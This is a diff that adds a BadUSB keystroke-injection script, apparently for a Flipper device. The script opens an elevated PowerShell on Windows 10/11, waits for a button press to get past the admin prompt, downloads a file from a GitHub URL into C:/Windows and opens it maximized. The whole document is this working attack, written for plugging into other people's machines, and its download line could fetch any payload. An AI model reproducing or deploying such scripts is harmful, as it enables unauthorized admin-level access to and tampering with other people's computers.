@@ -1,0 +1,27 @@
+REM Est. Execution Time:xxx ms 
+REM Character Count: 	368
+REM Author: 		ZilXen
+REM Description: 		The script opens an PowerShell window and downloading and opening a file from a URL on a
+REM Description: 			Windows system.
+REM Version: 		1.0
+REM Category: 		CopySelfwriting
+REM Target: 		Windows 10,11
+DELAY 1000
+WINDOWS d
+DELAY 1000
+WINDOWS r
+DELAY 700
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1200
+LEFT
+WAIT_FOR_BUTTON_PRESS
+DELAY 1200
+ENTER
+DELAY 1700
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/zilxen/Flipper/main/BadKB-resources/Ahegao.txt -OutFile C:/Windows/Ahegao.txt; Start-Process -FilePath "C:/windows/Ahegao.txt" -WindowStyle maximized
+ENTER
+DELAY 800
+CTRL 0
+CTRL -
+REPEAT 3
